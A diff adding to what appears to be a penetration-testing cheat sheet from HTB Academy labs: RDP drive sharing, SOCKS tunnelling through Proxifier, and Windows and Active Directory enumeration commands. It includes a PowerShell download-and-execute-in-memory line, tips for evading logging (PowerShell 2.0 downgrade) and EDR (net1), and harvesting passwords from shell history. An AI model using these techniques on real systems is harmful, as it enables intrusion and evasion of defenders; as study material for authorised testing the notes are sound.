@@ -1078,6 +1078,14 @@ xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
 xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
 ```
 
+To access the shared folder from within the RDP session, connect to `\\tsclient\` in File Explorer (Network tab):
+
+![Pasted image 20260623191726](images/Pasted%20image%2020260623191726.png)
+
+Alternative using `mstsc.exe`: Local Resources > Local devices and resources > More > Drives:
+
+![Pasted image 20260623191829](images/Pasted%20image%2020260623191829.png)
+
 ### rdesktop
 ```bash
 rdesktop -u htb-student -p HTB_@cademy_stdnt! 10.129.34.4
@@ -1701,6 +1709,10 @@ xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123
 ```bash
 plink -ssh -D 9050 ubuntu@10.129.15.50
 ```
+
+Configure [Proxifier](https://www.proxifier.com) with a SOCKS proxy at `127.0.0.1:9050` to route traffic through the tunnel, then launch `mstsc.exe` directly:
+
+![Pasted image 20260716190120](images/Pasted%20image%2020260716190120.png)
 
 ### Rpivot
 ```bash
@@ -3360,3 +3372,187 @@ Common patterns: `$desktop%@admin123` (workstations), `$server%@admin123` (serve
 ---
 
 ## Living Off the Land
+
+### Windows Enumeration Commands
+
+| Command | Description |
+| :--- | :--- |
+| `hostname` | Prints the PC's name |
+| `[System.Environment]::OSVersion.Version` | Prints out the OS version and revision level |
+| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host |
+| `ipconfig /all` | Prints out network adapter state and configurations |
+| `set` | Displays a list of environment variables for the current session (from CMD) |
+| `echo %USERDOMAIN%` | Displays the domain name to which the host belongs (from CMD) |
+| `echo %logonserver%` | Prints out the name of the Domain Controller the host checks in with (from CMD) |
+
+Running `systeminfo` combined with the above gives an initial picture of the host state with fewer log entries.
+
+### PowerShell Enumeration & Execution Commands
+
+| Cmdlet / Command | Description |
+| :--- | :--- |
+| `Get-Module` | Lists available modules loaded for use |
+| `Get-ExecutionPolicy -List` | Prints the execution policy settings for each scope |
+| `Set-ExecutionPolicy Bypass -Scope Process` | Changes the policy for the current process only (reverts on exit) |
+| `Get-ChildItem Env: \| ft Key,Value` | Returns environment values such as key paths, users, computer info |
+| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Gets the specified user's PowerShell history (may contain passwords) |
+| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <follow-on commands>"` | Quick way to download a file from the web and call it from memory |
+
+#### Downgrade PowerShell
+
+PowerShell event logging was introduced in version 3.0. Calling version 2.0 bypasses script block logging in the event viewer.
+
+```powershell
+Get-host                   # check current version
+powershell.exe -version 2  # downgrade (the downgrade command itself will be logged)
+Get-host                   # confirm version 2
+```
+
+### Checking Defenses
+
+#### Firewall checks
+
+```powershell
+netsh advfirewall show allprofiles
+```
+
+#### Windows Defender Check
+
+```
+sc query windefend
+Get-MpComputerStatus
+```
+
+### Check if You Are Alone
+
+```powershell
+qwinsta
+```
+
+### Network & Firewall Enumeration Commands
+
+| Command | Description |
+| :--- | :--- |
+| `arp -a` | Lists all known hosts stored in the ARP table |
+| `ipconfig /all` | Prints out adapter settings for the host |
+| `route print` | Displays the routing table (IPv4 & IPv6) |
+| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall |
+
+### Windows Management Instrumentation (WMI)
+
+#### WMIC Enumeration Commands
+
+| Command | Description |
+| :--- | :--- |
+| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patch level and description of Hotfixes applied |
+| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information |
+| `wmic process list /format:list` | A listing of all processes on host |
+| `wmic ntdomain list /format:list` | Displays information about the Domain and Domain Controllers |
+| `wmic useraccount list /format:list` | Displays information about all local accounts and any domain accounts |
+| `wmic group list /format:list` | Information about all local groups |
+| `wmic sysaccount list /format:list` | Dumps information about system accounts used as service accounts |
+
+Domain, child domain, and external forest trust info:
+```powershell
+wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
+```
+
+### Net Commands
+
+> `net.exe` commands are typically monitored by EDR solutions. Use `net1` as an alternative to avoid triggering signature-based detection.
+
+#### Net Commands Enumeration & Management
+
+| Command | Description |
+| :--- | :--- |
+| `net accounts` | Information about password requirements |
+| `net accounts /domain` | Password and lockout policy |
+| `net group /domain` | Information about domain groups |
+| `net group "Domain Admins" /domain` | List users with domain admin privileges |
+| `net group "domain computers" /domain` | List of PCs connected to the domain |
+| `net group "Domain Controllers" /domain` | List PC accounts of domain controllers |
+| `net group <domain_group_name> /domain` | Users that belong to the specified group |
+| `net groups /domain` | List of domain groups |
+| `net localgroup` | All available local groups |
+| `net localgroup administrators /domain` | List users in the administrators group (includes Domain Admins) |
+| `net localgroup Administrators` | Information about a local group (admins) |
+| `net localgroup administrators [username] /add` | Add user to local administrators group |
+| `net share` | Check current shares |
+| `net user <ACCOUNT_NAME> /domain` | Get information about a user within the domain |
+| `net user /domain` | List all users of the domain |
+| `net user %username%` | Information about the current user |
+| `net use x: \\computer\share` | Mount the share locally |
+| `net view` | Get a list of computers |
+| `net view /all /domain[:domainname]` | Shares on the domains |
+| `net view \\computer /ALL` | List shares of a computer |
+| `net view /domain` | List of PCs of the domain |
+
+### Dsquery
+
+Active Directory object search tool. Available only on hosts with the AD DS Role (typically DCs). Requires elevated privileges (SYSTEM context).
+
+#### User Search
+
+```powershell
+dsquery user
+```
+
+#### Computer Search
+
+```powershell
+dsquery computer
+```
+
+#### Wildcard Search
+
+```powershell
+dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+```
+
+#### Users With Specific Attributes Set (PASSWD_NOTREQD)
+
+```powershell
+dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
+```
+
+#### Searching for Domain Controllers
+
+```powershell
+dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
+```
+
+### LDAP Filtering Explained
+
+`userAccountControl:1.2.840.113556.1.4.803:=8192` — searches the UAC attribute for a specific bit value (`8192` = Domain Controller).
+
+**OID match rules:**
+1. `1.2.840.113556.1.4.803` — bit value must match completely (exact match)
+2. `1.2.840.113556.1.4.804` — any bit in the chain matches (OR-style)
+3. `1.2.840.113556.1.4.1941` — searches through ownership and membership entries (nested groups)
+
+**Logical operators:** `&` (AND), `|` (OR), `!` (NOT)
+
+```
+# Users where password can't change (UAC bit 64)
+(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))
+
+# Users where password CAN change (NOT bit 64)
+(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))
+```
+
+**UAC bit reference:**
+
+```
+1    Login Script Will Execute
+2    Account Is Disabled
+32   Password Not Required
+64   Password Can't Change
+128  Encrypted Text Password Allowed
+512  Normal User Account
+2048 Interdomain Trust Account
+4096 Domain Workstation or Member Server
+8192 Domain Controller
+65536 Password Does Not Expire
+524288 Trusted For Impersonation
+1048576 Account May Not Be Impersonated
+```
